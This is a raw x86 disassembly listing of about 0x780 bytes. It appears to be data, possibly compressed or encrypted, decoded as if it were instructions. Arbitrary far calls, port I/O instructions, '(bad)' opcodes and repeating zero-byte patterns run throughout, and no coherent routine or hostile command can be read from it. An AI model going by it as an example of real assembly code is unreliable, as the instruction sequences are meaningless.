  42285c:	ret    0x3bcf
  42285f:	and    eax,0x8e6e49bb
  422864:	dec    ebx
  422865:	repnz sbb ch,BYTE PTR ds:0xe07f5d4e
  42286c:	in     eax,0x80
  42286e:	dec    edx
  42286f:	cs inc esp
  422871:	lahf   
  422872:	call   0xe89:0x83a2949c
  422879:	push   edi
  42287a:	sub    ah,0x10
  42287d:	test   BYTE PTR [eax],al
  42287f:	aam    0xe3
  422881:	fnop   
  422883:	ins    DWORD PTR es:[edi],dx
  422884:	fidivr WORD PTR [eax+0x4c]
  422887:	xlat   BYTE PTR ds:[ebx]
  422888:	jo     0x422896
  42288a:	jae    0x4228f2
  42288c:	mov    DWORD PTR [edi-0x2127928c],0xc72b9b62
  422896:	test   eax,0x93543f9d
  42289b:	jbe    0x42289d
  42289d:	add    BYTE PTR [eax],al
  42289f:	add    BYTE PTR [eax],al
  4228a1:	add    BYTE PTR [edi],ah
  4228a3:	push   ecx
  4228a4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4228ae:	call   0x1dd:0xedda4032
  4228b5:	add    BYTE PTR [edx+0x0],ah
  4228b8:	add    BYTE PTR [eax],al
  4228ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228bb:	cmp    DWORD PTR [ecx+0x68],0x16548b24
  4228c2:	xlat   BYTE PTR ds:[ebx]
  4228c3:	icebp  
  4228c4:	mov    dl,0xcf
  4228c6:	xor    dl,BYTE PTR [esi+ebx*2]
  4228c9:	inc    edi
  4228ca:	scas   eax,DWORD PTR es:[edi]
  4228cb:	xchg   dl,bh
  4228cd:	xchg   ecx,eax
  4228ce:	jo     0x422945
  4228d0:	push   ecx
  4228d1:	mov    ah,bl
  4228d3:	stos   DWORD PTR es:[edi],eax
  4228d4:	(bad)  
  4228d5:	retf   
  4228d6:	arpl   WORD PTR [edi],bp
  4228d8:	pop    esp
  4228d9:	loopne 0x4228ae
  4228db:	inc    esi
  4228dc:	xchg   esp,eax
  4228dd:	(bad)  
  4228de:	cmp    eax,0x635d54e1
  4228e3:	test   DWORD PTR [ecx*2+0x67ad552a],ecx
  4228ea:	inc    DWORD PTR [edi+0x8]
  4228ed:	out    0x2d,eax
  4228ef:	dec    esp
  4228f0:	add    ebp,ecx
  4228f2:	loop   0x422957
  4228f4:	out    dx,al
  4228f5:	outs   dx,BYTE PTR ds:[esi]
  4228f6:	inc    edi
  4228f7:	mov    DWORD PTR ds:[eax],eax
  4228fa:	xchg   ebp,eax
  4228fb:	test   DWORD PTR [ebx+0x3b],ecx
  4228fe:	cmp    DWORD PTR [esi-0x80],edx
  422901:	gs emms 
  422904:	sbb    BYTE PTR [edx-0x1ace093b],ch
  42290a:	(bad)  
  42290b:	mov    edi,0x4034735d
  422910:	into   
  422911:	inc    edi
  422912:	test   esp,esp
  422914:	fiadd  WORD PTR [esi-0x63ecbdd4]
  42291a:	(bad)  
  42291b:	xor    eax,0x0
  422920:	add    BYTE PTR [eax],al
  422922:	add    dl,BYTE PTR ss:[ebp+0xc]
  422926:	jne    0x422987
  422928:	jg     0x422964
  42292a:	clc    
  42292b:	cs aas 
  42292d:	push   0x487947c0
  422932:	and    eax,0x620001d0
  422937:	add    BYTE PTR [eax],al
  422939:	add    BYTE PTR [ecx],ch
  42293b:	mov    ds:0x51963b4e,eax
  422940:	idiv   DWORD PTR [edi-0x77]
  422943:	lea    edi,[eax+0x13]
  422946:	div    BYTE PTR [eax-0x56]
  422949:	cmp    DWORD PTR [edx-0x22accc04],esi
  42294f:	inc    esi
  422950:	inc    eax
  422951:	call   DWORD PTR [edx]
  422953:	dec    edx
  422954:	scas   eax,DWORD PTR es:[edi]
  422955:	stc    
  422956:	retf   0xe9f7
  422959:	add    ebx,ebx
  42295b:	mov    al,ds:0x5fc21531
  422960:	mov    ch,0x87
  422962:	pop    ecx
  422963:	fiadd  WORD PTR [esi-0xb]
  422967:	pop    esp
  422968:	xor    eax,0x2d43a5a2
  42296d:	or     eax,0x90a85177
  422972:	int3   
  422973:	jmp    0x663332cf
  422978:	sbb    dh,ah
  42297a:	std    
  42297b:	pop    ecx
  42297c:	mov    ch,0xa3
  42297e:	popa   
  42297f:	repz pop esi
  422981:	sub    BYTE PTR [ebx],bh
  422983:	daa    
  422984:	gs jmp 0x4229bb
  422987:	add    DWORD PTR [ebx-0x418e4efb],edx
  42298d:	mov    dh,0x10
  42298f:	mov    DWORD PTR [ebx],0x56214b90
  422995:	pop    es
  422996:	jnp    0x4229d6
  422998:	and    al,0x49
  42299a:	xlat   BYTE PTR ds:[ebx]
  42299b:	sub    al,BYTE PTR [eax]
  42299d:	add    BYTE PTR [eax],al
  42299f:	add    BYTE PTR [eax],al
  4229a1:	add    BYTE PTR [eax],cl
  4229a3:	mov    cl,0x72
  4229a5:	cmp    edi,ebx
  4229a7:	sti    
  4229a8:	dec    ecx
  4229a9:	mov    bl,0x94
  4229ab:	je     0x422984
  4229ad:	call   0xd087:0x7566180c
  4229b4:	add    DWORD PTR [eax],eax
  4229b6:	bound  eax,QWORD PTR [eax]
  4229b8:	add    BYTE PTR [eax],al
  4229ba:	sub    ebp,esp
  4229bc:	das    
  4229bd:	jmp    0x3ed77639
  4229c2:	and    eax,0x43ed66fb
  4229c7:	mov    edx,0x58612b47
  4229cc:	mov    cl,0xd1
  4229ce:	adc    DWORD PTR [ebx],esp
  4229d0:	cld    
  4229d1:	adc    esp,DWORD PTR [esi+0x46b96633]
  4229d7:	and    al,0xfe
  4229d9:	inc    ebx
  4229da:	cmp    dh,BYTE PTR [esp+edx*1-0x3e]
  4229de:	stc    
  4229df:	in     al,0xe8
  4229e1:	stc    
  4229e2:	xchg   esp,edi
  4229e4:	mov    DWORD PTR [ecx+0x0],ebp
  4229e7:	rcl    cl,1
  4229e9:	daa    
  4229ea:	(bad)  
  4229eb:	cmp    BYTE PTR [edx-0x68a52c8b],bh
  4229f1:	and    ecx,ebx
  4229f3:	cmp    ah,BYTE PTR [eax]
  4229f5:	jb     0x4229d7
  4229f7:	mov    ch,0x1b
  4229f9:	data16 out 0xec,al
  4229fc:	or     eax,0x7a86849e
  422a01:	cmp    al,BYTE PTR [esi+0x3f]
  422a04:	sbb    DWORD PTR [ecx-0x55],edi
  422a07:	xchg   ecx,eax
  422a08:	xchg   edi,eax
  422a09:	cmp    al,0xb0
  422a0b:	mov    ah,0x4
  422a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a0e:	fdiv   st(0),st
  422a10:	adc    al,0xbb
  422a12:	lahf   
  422a13:	out    dx,eax
  422a14:	aas    
  422a15:	xchg   ebp,eax
  422a16:	inc    edx
  422a17:	lea    esp,[edi]
  422a19:	ins    DWORD PTR es:[edi],dx
  422a1a:	stos   BYTE PTR es:[edi],al
  422a1b:	sldt   WORD PTR [eax]
  422a1e:	add    BYTE PTR [eax],al
  422a20:	add    BYTE PTR [eax],al
  422a22:	fist   WORD PTR [ebx-0x4e]
  422a25:	dec    edi
  422a26:	mov    esi,0x67d3ffef
  422a2b:	xchg   ecx,edi
  422a2d:	adc    al,0x76
  422a2f:	rol    BYTE PTR [esi],0x2c
  422a32:	jmp    0x62422c07
  422a37:	add    BYTE PTR [eax],al
  422a39:	add    BYTE PTR [esi-0x44],cl
  422a3c:	xchg   ecx,eax
  422a3d:	arpl   WORD PTR [esi],ax
  422a3f:	pop    es
  422a40:	push   edi
  422a41:	lods   eax,DWORD PTR ds:[esi]
  422a42:	fstp   QWORD PTR [eax*4+0x3f5659fe]
  422a49:	push   ecx
  422a4a:	daa    
  422a4b:	jl     0x4229dc
  422a4d:	mov    edi,0x312cc55d
  422a52:	adc    eax,0x7a273cc3
  422a57:	push   0xfa1440d4
  422a5c:	pusha  
  422a5d:	add    eax,esp
  422a5f:	cmp    al,0x84
  422a61:	or     BYTE PTR [eax+0x6a],ch
  422a64:	fidivr DWORD PTR [ebx+0x5234211a]
  422a6a:	sbb    DWORD PTR [esi],esi
  422a6c:	push   ss
  422a6d:	mov    cl,0xbe
  422a6f:	call   0x9319:0x59b9de5b
  422a76:	jo     0x422a07
  422a78:	aas    
  422a79:	scas   al,BYTE PTR es:[edi]
  422a7a:	xchg   esp,eax
  422a7b:	xchg   DWORD PTR [eax+0x39],edx
  422a7e:	xchg   ebp,eax
  422a7f:	les    eax,FWORD PTR [eax]
  422a81:	pop    eax
  422a82:	idiv   BYTE PTR [esi-0x332568f2]
  422a88:	cdq    
  422a89:	mov    esp,0x2f564950
  422a8e:	cmc    
  422a8f:	es jle 0x422b03
  422a92:	or     eax,0x72943f9a
  422a97:	lea    edx,[esi]
  422a99:	aas    
  422a9a:	fbld   TBYTE PTR [esi+0x0]
  422aa0:	add    BYTE PTR [eax],al
  422aa2:	xchg   DWORD PTR [ebx+edx*8],ecx
  422aa5:	fcmovu st,st(3)
  422aa7:	fisttp WORD PTR [edi+0x640ccb5d]
  422aad:	push   ss
  422aae:	mov    edx,0x4b321170
  422ab3:	rol    DWORD PTR [ecx],1
  422ab5:	add    BYTE PTR [edx+0x0],ah
  422ab8:	add    BYTE PTR [eax],al
  422aba:	push   edx
  422abb:	xchg   DWORD PTR [edi+0x40],ebp
  422abe:	ds jo  0x422a47
  422ac1:	out    dx,eax
  422ac2:	jns    0x422b21
  422ac4:	jle    0x422ac5
  422ac6:	test   DWORD PTR [esi+0x538ac966],0x1508b5de
  422ad0:	stos   BYTE PTR es:[di],al
  422ad2:	mov    cl,0xe2
  422ad4:	jmp    0x422a56
  422ad6:	stos   DWORD PTR es:[edi],eax
  422ad7:	pop    es
  422ad8:	mov    dh,0xef
  422ada:	push   ebp
  422adb:	cwde   
  422adc:	adc    al,0x5d
  422ade:	and    bl,bl
  422ae0:	mov    ds:0x44261747,eax
  422ae5:	mov    ecx,0x4d5c0fa
  422aea:	rcr    DWORD PTR [ebp-0x5e],1
  422aed:	outs   dx,DWORD PTR ds:[esi]
  422aee:	mov    BYTE PTR [eax],dl
  422af0:	mov    dh,0x3b
  422af2:	jno    0x422acf
  422af4:	push   edi
  422af5:	inc    ecx
  422af6:	je     0x422a7a
  422af8:	repnz xchg edx,eax
  422afa:	cdq    
  422afb:	int3   
  422afc:	call   0xe2ad0e3d
  422b01:	int    0xf4
  422b03:	xor    DWORD PTR [edx],edx
  422b05:	mov    al,0xa
  422b07:	adc    bl,ch
  422b09:	add    DWORD PTR [esi+0x5c755f92],edx
  422b0f:	fldenv [ebx-0x1ec1e147]
  422b15:	aad    0x1b
  422b17:	mov    ch,ch
  422b19:	ror    DWORD PTR [eax],1
  422b1b:	ins    DWORD PTR es:[edi],dx
  422b1c:	add    BYTE PTR [eax],al
  422b1e:	add    BYTE PTR [eax],al
  422b20:	add    BYTE PTR [eax],al
  422b22:	lahf   
  422b23:	arpl   WORD PTR [ebp+0x72],cx
  422b26:	std    
  422b27:	jle    0x422ae8
  422b29:	out    dx,eax
  422b2a:	sbb    edi,esp
  422b2c:	mov    BYTE PTR [esp+ebp*1-0x52dd7bab],dh
  422b33:	rol    DWORD PTR [ecx],1
  422b35:	add    BYTE PTR [edx+0x0],ah
  422b38:	add    BYTE PTR [eax],al
  422b3a:	dec    eax
  422b3b:	or     ebx,DWORD PTR [eax+0x10b07c12]
  422b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b43:	jo     0x422ba0
  422b45:	mov    ch,0x11
  422b47:	stos   BYTE PTR es:[edi],al
  422b48:	nop
  422b49:	adc    eax,0xbd9f2c11
  422b4e:	in     eax,0xeb
  422b50:	mov    bh,0x62
  422b52:	and    edi,DWORD PTR [edi+edi*1+0x69]
  422b56:	mov    dh,0x78
  422b58:	push   es
  422b59:	(bad)  
  422b5a:	call   DWORD PTR [edi-0x590fff01]
  422b60:	sub    dh,BYTE PTR [ecx-0x1e]
  422b63:	xor    BYTE PTR [edi],0xb5
  422b66:	pop    es
  422b67:	enter  0xbb17,0xfe
  422b6b:	jns    0x422b9d
  422b6d:	push   edx
  422b6e:	dec    esi
  422b6f:	icebp  
  422b70:	or     DWORD PTR [ebp+0x6d],esp
  422b73:	fst    DWORD PTR [esi+eiz*4+0x6d]
  422b77:	dec    esp
  422b78:	dec    edx
  422b79:	sar    DWORD PTR [ebx+0x2bee119c],1
  422b7f:	fs mov ebx,0xc48aabc5
  422b85:	scas   al,BYTE PTR es:[edi]
  422b86:	or     BYTE PTR [ebx+0x4f],bl
  422b89:	test   BYTE PTR [ecx-0x75],dl
  422b8c:	dec    esp
  422b8d:	scas   eax,DWORD PTR es:[edi]
  422b8e:	retf   0x15ab
  422b91:	mov    cl,0x65
  422b93:	mov    al,ds:0x68463274
  422b98:	data16 ror cl,1
  422b9b:	xor    eax,0x0
  422ba0:	add    BYTE PTR [eax],al
  422ba2:	jo     0x422bc7
  422ba4:	and    eax,0x7c6f7769
  422ba9:	cmp    esp,DWORD PTR [eax+0x34bcee1c]
  422baf:	sub    DWORD PTR [eax],ebp
  422bb1:	dec    ebx
  422bb2:	psrld  mm0,QWORD PTR [ecx]
  422bb5:	add    BYTE PTR [edx+0x0],ah
  422bb8:	add    BYTE PTR [eax],al
  422bba:	cwde   
  422bbb:	xchg   esi,eax
  422bbc:	out    0x7b,eax
  422bbe:	adc    eax,esp
  422bc0:	sbb    eax,0x732b0e89
  422bc5:	das    
  422bc6:	in     eax,0x66
  422bc8:	lods   eax,DWORD PTR ds:[esi]
  422bc9:	ficom  WORD PTR [esp+eiz*2]
  422bcc:	call   0x6fac8fd3
  422bd1:	or     eax,DWORD PTR [esi+0x796bbb94]
  422bd7:	retf   0x5ad5
  422bda:	jns    0x422c4d
  422bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bde:	das    
  422bdf:	sub    ebx,edi
  422be1:	lock loope 0x422bf7
  422be4:	jle    0x422c65
  422be6:	test   al,0x96
  422be8:	je     0x422b91
  422bea:	push   ss
  422beb:	mov    ch,0xe8
  422bed:	shl    BYTE PTR [edx+0x16],cl
  422bf0:	or     DWORD PTR [edx+0x7e],esp
  422bf3:	xor    ebp,DWORD PTR ds:0xffb6cd62
  422bf9:	dec    ebp
  422bfa:	add    ebp,ebp
  422bfc:	jb     0x422b81
  422bfe:	mov    esi,0x6fd3b2cd
  422c03:	push   ebp
  422c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c05:	cli    
  422c06:	gs dec ebx
  422c08:	imul   eax,DWORD PTR [ebp+0x11e74ff7],0x43
  422c0f:	pop    edx
  422c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c11:	sbb    al,bh
  422c13:	jecxz  0x422c82
  422c15:	sahf   
  422c16:	adc    bl,0x2c
  422c19:	int    0xf8
  422c1b:	inc    ebx
  422c1c:	add    BYTE PTR [eax],al
  422c1e:	add    BYTE PTR [eax],al
  422c20:	add    BYTE PTR [eax],al
  422c22:	xchg   esp,eax
  422c23:	nop
  422c24:	ffree  st(0)
  422c26:	(bad)  
  422c28:	popf   
  422c29:	aam    0x57
  422c2b:	(bad)
  422c2f:	xchg   ebx,eax
  422c30:	push   esp
  422c31:	scas   eax,DWORD PTR es:[edi]
  422c32:	jno    0x422c06
  422c34:	add    DWORD PTR [eax],eax
  422c36:	bound  eax,QWORD PTR [eax]
  422c38:	add    BYTE PTR [eax],al
  422c3a:	ret    
  422c3b:	inc    edx
  422c3c:	mov    ch,0x57
  422c3e:	cmp    eax,0xd78f8bf
  422c43:	or     ebp,edx
  422c45:	fst    QWORD PTR [ebx+0x54]
  422c48:	sub    eax,0xddf2a31f
  422c4d:	inc    esi
  422c4e:	mov    dl,0x7f
  422c50:	jae    0x422be9
  422c52:	push   0x554a411c
  422c57:	sbb    al,0x98
  422c59:	and    dh,ah
  422c5b:	les    esi,FWORD PTR [ebx]
  422c5d:	dec    edi
  422c5e:	out    dx,al
  422c5f:	sub    al,0x2
  422c61:	cmc    
  422c62:	popf   
  422c63:	in     al,0x11
  422c65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c66:	sbb    eax,0xa9bab45a
  422c6b:	adc    BYTE PTR [ecx-0x4a296f33],0x1d
  422c72:	or     al,0x24
  422c74:	call   0x71e10163
  422c79:	fisub  DWORD PTR [esi]
  422c7b:	mov    al,0x8b
  422c7d:	sbb    DWORD PTR [ecx+0x6b],esi
  422c80:	in     eax,dx
  422c81:	je     0x422c1a
  422c83:	add    al,0x4b
  422c85:	test   eax,0x878d8831
  422c8a:	xor    dh,BYTE PTR [ebx]
  422c8c:	hlt    
  422c8d:	in     al,dx
  422c8e:	out    dx,eax
  422c8f:	xchg   ebp,eax
  422c90:	lock stos BYTE PTR es:[edi],al
  422c92:	adc    eax,0x5c365388
  422c97:	cli    
  422c98:	sahf   
  422c99:	xor    eax,0xc364
  422c9e:	add    BYTE PTR [eax],al
  422ca0:	add    BYTE PTR [eax],al
  422ca2:	hlt    
  422ca3:	mov    dl,0x32
  422ca5:	(bad)  
  422ca6:	jbe    0x422c7e
  422ca8:	hlt    
  422ca9:	mov    dl,0xb1
  422cab:	and    al,0xfe
  422cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cae:	arpl   WORD PTR [esi],ax
  422cb0:	imul   edi
  422cb2:	rcl    edx,cl
  422cb4:	add    DWORD PTR [eax],eax
  422cb6:	bound  eax,QWORD PTR [eax]
  422cb8:	add    BYTE PTR [eax],al
  422cba:	sar    DWORD PTR [esi-0x4f],0x12
  422cbe:	mov    ecx,0x582b919f
  422cc3:	cdq    
  422cc4:	mov    al,ds:0x8c661a5a
  422cc9:	pop    edi
  422cca:	gs das 
  422ccc:	sub    al,0x5d
  422cce:	push   ss
  422ccf:	mov    ecx,0x3233465c
  422cd4:	mov    bh,0xef
  422cd6:	imul   esp,DWORD PTR [eax+0x38],0xef831d65
  422cdd:	xor    DWORD PTR [ecx+0x1c9dcc8b],0xfffffff3
  422ce4:	mov    ds:0x7b2c5040,eax
  422ce9:	push   edx
  422cea:	xor    dh,BYTE PTR [ecx-0x3e]
  422ced:	popf   
  422cee:	(bad)  
  422cef:	sti    
  422cf0:	ss inc esp
  422cf2:	fisub  DWORD PTR [ebx]
  422cf4:	mov    esp,0x45453721
  422cf9:	mov    ds:0x1fcb2847,eax
  422cfe:	out    dx,eax
  422cff:	pop    edi
  422d00:	outs   dx,BYTE PTR ds:[esi]
  422d01:	mov    cl,0xe7
  422d03:	pop    esp
  422d04:	pop    ds
  422d05:	ja     0x422c87
  422d07:	lea    ecx,[edi]
  422d09:	daa    
  422d0a:	inc    eax
  422d0b:	cmp    esp,0xffffffef
  422d0e:	jnp    0x422cc0
  422d10:	fistp  DWORD PTR [edi+0x21]
  422d13:	mov    WORD PTR [ebp+0x35],fs
  422d16:	mov    edi,0xe66956e4
  422d1b:	add    BYTE PTR fs:[eax],al
  422d1e:	add    BYTE PTR [eax],al
  422d20:	add    BYTE PTR [eax],al
  422d22:	xor    dl,bl
  422d24:	into   
  422d25:	mov    ds:0xd37ebfef,al
  422d2a:	sub    edi,DWORD PTR [esi]
  422d2c:	out    0x3f,eax
  422d2e:	pop    edi
  422d2f:	add    DWORD PTR [edx*1+0x1d335],0x62
  422d37:	add    BYTE PTR [eax],al
  422d39:	add    BYTE PTR [eax+edi*1+0x0],cl
  422d3d:	cmp    eax,ecx
  422d3f:	or     eax,0x9511de0a
  422d44:	lock and DWORD PTR [edi+ebp*4+0x62],ebx
  422d49:	or     al,0xe4
  422d4b:	xor    eax,0xa892d0d7
  422d50:	jae    0x422d81
  422d52:	adc    eax,0xd615c2fd
  422d57:	lods   al,BYTE PTR ds:[esi]
  422d58:	mov    eax,ds:0xc049214e
  422d5d:	test   BYTE PTR [edx+0x54],ch
  422d60:	push   ds
  422d61:	jecxz  0x422d5b
  422d63:	aam    0x3b
  422d65:	dec    esp
  422d66:	push   edi
  422d67:	aad    0x8c
  422d69:	loop   0x422d9c
  422d6b:	es dec edi
  422d6d:	ins    BYTE PTR es:[edi],dx
  422d6e:	push   ebx
  422d6f:	shr    bh,0xaa
  422d72:	jo     0x422de4
  422d74:	push   ebx
  422d75:	mov    ecx,0xc5849e9
  422d7a:	xchg   esp,eax
  422d7b:	dec    ch
  422d7d:	add    al,0x18
  422d7f:	jns    0x422def
  422d81:	sbb    al,0x32
  422d83:	push   ebp
  422d84:	gs or  eax,0xe573bd37
  422d8a:	jbe    0x422d4b
  422d8c:	inc    eax
  422d8d:	jmp    0x422d8c
  422d8f:	xchg   ebx,eax
  422d90:	int    0xa
  422d92:	aad    0x9c
  422d94:	rcl    cl,1
  422d96:	cli    
  422d97:	aam    0xdf
  422d99:	test   eax,0x8ae0
  422d9e:	add    BYTE PTR [eax],al
  422da0:	add    BYTE PTR [eax],al
  422da2:	fucomi st,st(5)
  422da4:	outs   dx,BYTE PTR ds:[esi]
  422da5:	and    bh,BYTE PTR [esi-0x5d]
  422da8:	(bad)  
  422daa:	pop    esi
  422dab:	(bad)  
  422dac:	mov    DWORD PTR [ebp-0x508257af],ecx
  422db2:	xchg   edi,eax
  422db3:	rol    DWORD PTR [ecx],cl
  422db5:	add    BYTE PTR [edx+0x0],ah
  422db8:	add    BYTE PTR [eax],al
  422dba:	sbb    esi,DWORD PTR [ecx-0xc93add3]
  422dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dc1:	loop   0x422dc3
  422dc3:	pushf  
  422dc4:	mul    DWORD PTR [esi]
  422dc6:	scas   eax,DWORD PTR es:[edi]
  422dc7:	(bad)  
  422dca:	sub    DWORD PTR [esi],esi
  422dcc:	loopne 0x422dd5
  422dce:	push   ebp
  422dcf:	jne    0x422df5
  422dd1:	jg     0x422e1b
  422dd3:	sbb    esp,DWORD PTR [edx+0x10]
  422dd6:	lock int3 
  422dd8:	repz mov ebp,0x2e49774a
  422dde:	and    ch,BYTE PTR [ebx+0x7d]
  422de1:	mov    ah,0xeb
  422de3:	and    BYTE PTR [ebp-0x39ccd727],dh
  422de9:	dec    edi
  422dea:	das    
  422deb:	cld    
  422dec:	int    0xf9
  422dee:	call   0x6f49104b
  422df3:	setle  bl
  422df6:	inc    edx
  422df7:	push   es
  422df8:	lods   eax,DWORD PTR ds:[esi]
  422df9:	mov    edi,0xa6a125f0
  422dfe:	inc    esi
  422dff:	or     ebx,DWORD PTR [ecx-0x6b]
  422e02:	inc    esp
  422e03:	and    eax,0xc61e8d4b
  422e08:	push   ecx
  422e09:	fdiv   st,st(1)
  422e0b:	jp     0x422e03
  422e0d:	inc    edx
  422e0e:	and    al,0x34
  422e10:	loop   0x422d9d
  422e12:	xchg   ecx,eax
  422e13:	imul   eax,ebx,0xffffffc6
  422e16:	mov    ch,0x94
  422e18:	addr16 push ss
  422e1a:	test   al,0x77
  422e1c:	add    BYTE PTR [eax],al
  422e1e:	add    BYTE PTR [eax],al
  422e20:	add    BYTE PTR [eax],al
  422e22:	add    eax,0x6f976b22
  422e27:	(bad)  
  422e29:	mov    dl,0x66
  422e2b:	and    BYTE PTR [esi-0x6b6eb096],ah
  422e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e32:	stc    
  422e33:	rol    DWORD PTR [ecx],cl
  422e35:	add    BYTE PTR [edx+0x0],ah
  422e38:	add    BYTE PTR [eax],al
  422e3a:	ret    0xc9da
  422e3d:	fdivrp st(0),st
  422e3f:	mov    DWORD PTR [ecx],ebx
  422e41:	and    BYTE PTR [edx+0x5b],ch
  422e44:	shl    DWORD PTR [ebx],0x41
  422e47:	jo     0x422dd4
  422e49:	(bad)  
  422e4a:	fisubr DWORD PTR ds:0x2ccc782d
  422e50:	push   ebp
  422e51:	imul   edx,DWORD PTR [ecx-0x43c12f64],0xffffffe3
  422e58:	mov    esp,DWORD PTR [ecx]
  422e5a:	call   0x4451:0x789b996
  422e61:	out    0xc1,eax
  422e63:	mov    al,ds:0xc49b50d4
  422e68:	ins    BYTE PTR es:[edi],dx
  422e69:	push   ecx
  422e6a:	and    al,0x74
  422e6c:	call   0x7355:0xec31cddb
  422e73:	call   FWORD PTR [edx]
  422e75:	cld    
  422e76:	imul   eax,DWORD PTR [edx],0x3c7f403b
  422e7c:	jmp    0x1bd2:0xeb31fbe0
  422e83:	add    dl,0xb0
  422e86:	jg     0x422e83
  422e88:	outs   dx,DWORD PTR es:[esi]
  422e8a:	fwait
  422e8b:	shl    BYTE PTR [eax+0x2ecbf81f],1
  422e91:	dec    eax
  422e92:	pop    esi
  422e93:	inc    edi
  422e94:	ret    
  422e95:	bound  ebx,QWORD PTR [edi+esi*1+0x6d53ef3e]
  422e9c:	add    BYTE PTR [eax],al
  422e9e:	add    BYTE PTR [eax],al
  422ea0:	add    BYTE PTR [eax],al
  422ea2:	mov    edx,esp
  422ea4:	and    al,0xd9
  422ea6:	jg     0x422ea1
  422ea8:	call   esi
  422eaa:	into   
  422eab:	inc    ebp
  422eac:	mov    bh,0x11
  422eae:	mov    esp,0x5b66a968
  422eb3:	aam    0x1
  422eb5:	add    BYTE PTR [edx+0x0],ah
  422eb8:	add    BYTE PTR [eax],al
  422eba:	add    ebp,esp
  422ebc:	mov    ds:0x6573189c,eax
  422ec1:	inc    ebp
  422ec2:	(bad)  
  422ec3:	mov    esp,0x4387b6de
  422ec8:	retw   
  422eca:	or     BYTE PTR [ebp+0x55],cl
  422ecd:	push   es
  422ece:	mov    ah,BYTE PTR [ebp-0x3fcf3fe2]
  422ed4:	xchg   DWORD PTR [edi],esp
  422ed6:	inc    esi
  422ed7:	repz (bad) 
  422ed9:	fstp   st(4)
  422edb:	cmp    al,0x29
  422edd:	fcomp  st(1)
  422edf:	mov    fs,WORD PTR [ecx]
  422ee1:	push   ebx
  422ee2:	inc    ecx
  422ee3:	jno    0x422f0d
  422ee5:	cmc    
  422ee6:	push   ebp
  422ee7:	rol    DWORD PTR [ebx-0x19],0xdc
  422eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eec:	xor    eax,0xbcda7e1d
  422ef1:	xchg   DWORD PTR [ecx],esp
  422ef3:	mov    ecx,0xf8ba03b8
  422ef8:	push   eax
  422ef9:	sub    al,BYTE PTR [edi]
  422efb:	push   es
  422efc:	aad    0xc
  422efe:	lea    edi,[eax+0x2a]
  422f01:	pop    edx
  422f02:	pop    esi
  422f03:	jl     0x422f48
  422f05:	jp     0x422f5c
  422f07:	push   es
  422f08:	scas   al,BYTE PTR es:[edi]
  422f09:	lea    esi,[ebp-0x53]
  422f0c:	jae    0x422f2a
  422f0e:	cmp    BYTE PTR [eax-0x25],al
  422f11:	inc    eax
  422f12:	mov    ds:0x69c24662,al
  422f18:	jbe    0x422ec8
  422f1a:	and    bl,BYTE PTR [ebx+0x0]
  422f1d:	add    BYTE PTR [eax],al
  422f1f:	add    BYTE PTR [eax],al
  422f21:	add    dh,bl
  422f23:	sub    DWORD PTR [eax-0x210c002e],ebx
  422f29:	sub    eax,0x4af35f6
  422f2e:	inc    edx
  422f2f:	ds inc edi
  422f31:	enter  0xd4bd,0x1
  422f35:	add    BYTE PTR [edx+0x0],ah
  422f38:	add    BYTE PTR [eax],al
  422f3a:	and    BYTE PTR [ebp+0x12],0xd9
  422f3e:	push   esp
  422f3f:	mov    al,es:0xe11a47b0
  422f45:	ds dec ebp
  422f47:	push   0x4377663c
  422f4c:	pop    es
  422f4d:	stos   BYTE PTR es:[edi],al
  422f4e:	xchg   DWORD PTR [ebx-0x25],esi
  422f51:	sbb    DWORD PTR [edi+0x28],eax
  422f54:	stos   BYTE PTR es:[edi],al
  422f55:	std    
  422f56:	push   ebp
  422f57:	jne    0x422f9a
  422f59:	fimul  WORD PTR [edi]
  422f5b:	mov    WORD PTR [eax],ss
  422f5d:	adc    bl,bl
  422f5f:	push   es
  422f60:	add    DWORD PTR [eax],eax
  422f62:	rcl    BYTE PTR [edx],cl
  422f64:	pop    esi
  422f65:	out    dx,ax
  422f67:	leave  
  422f68:	pop    ss
  422f69:	add    cl,cl
  422f6b:	mov    eax,0x98c1feb2
  422f70:	(bad)  
  422f71:	iret   
  422f72:	cs sahf 
  422f74:	test   al,0xb0
  422f76:	inc    ecx
  422f77:	clc    
  422f78:	jnp    0x422fc7
  422f7a:	fsub   st,st(6)
  422f7c:	xchg   esp,eax
  422f7d:	mov    eax,0x85843c2d
  422f82:	or     al,0x56
  422f84:	xlat   BYTE PTR ds:[ebx]
  422f85:	retf   0x47b5
  422f88:	mov    eax,0x1e465747
  422f8d:	cmp    al,0xbc
  422f8f:	enter  0xebb4,0x35
  422f93:	mov    al,0xe7
  422f95:	imul   esp,DWORD PTR [edi+0x5e],0x4ed0b98f
  422f9c:	add    BYTE PTR [eax],al
  422f9e:	add    BYTE PTR [eax],al
  422fa0:	add    BYTE PTR [eax],al
  422fa2:	dec    esi
  422fa3:	aas    
  422fa4:	int3   
  422fa5:	sbb    eax,0x7fdffffd
  422faa:	out    dx,eax
  422fab:	loopne 0x422fc3
  422fad:	lods   al,BYTE PTR ds:[esi]
  422fae:	je     0x422f35
  422fb0:	xchg   edi,eax
  422fb1:	nop
  422fb2:	pop    ds
  422fb3:	aad    0x1
  422fb5:	add    BYTE PTR [edx+0x0],ah
  422fb8:	add    BYTE PTR [eax],al
  422fba:	mov    eax,ds:0xf3bd9eac
  422fbf:	push   esi
  422fc0:	pop    edx
  422fc1:	retf   0xfca3
  422fc4:	xor    DWORD PTR [esi],0xffffff82
  422fc7:	xchg   DWORD PTR ds:0x6ccb970e,ecx
  422fcd:	and    dh,BYTE PTR [eax+edx*1+0x464349fa]
  422fd4:	push   esi
  422fd5:	mov    ebp,0x3230175b
  422fda:	ret    
